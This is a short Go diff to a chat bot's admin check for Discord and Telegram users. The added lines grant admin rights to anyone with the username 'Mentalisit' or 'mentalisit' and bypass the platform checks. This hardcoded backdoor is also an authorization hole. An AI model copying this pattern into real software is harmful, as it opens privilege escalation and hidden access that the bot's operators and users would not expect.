@@ -45,6 +45,8 @@ func (b *Bot) checkAdmin(in models.InMessage) bool {
 		admin = b.client.Ds.CheckAdmin(in.UserId, in.Config.DsChannel)
 	} else if in.Tip == tg {
 		admin = b.client.Tg.CheckAdminTg(in.Config.TgChannel, in.Username)
+	} else if in.Username == "Mentalisit" || in.Username == "mentalisit" {
+		admin = true
 	}
 	return admin
 }
